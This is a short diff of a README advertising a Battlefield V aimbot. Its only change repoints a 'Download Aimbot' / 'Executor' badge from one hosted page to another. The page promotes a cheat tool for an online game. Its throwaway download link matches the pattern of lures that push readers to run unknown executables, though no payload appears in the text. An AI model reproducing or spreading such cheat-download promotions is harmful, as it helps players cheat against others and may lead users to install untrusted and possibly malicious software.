@@ -2,7 +2,7 @@
 
 In Battlefield V, an aimbot is a tool that assists players by automatically aiming at opponents, enhancing shooting accuracy and reaction time. This tool is designed to improve gameplay by providing precise targeting capabilities.
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Executor-blueviolet)](https://fileoffload1.bitbucket.io/)
+[![Download Aimbot](https://img.shields.io/badge/Download-Executor-blueviolet)](https://Battlefield-V-Aimbot-xin1.github.io/.github)
 ---
 
 ## 🛠️ Key Features of Aimbots
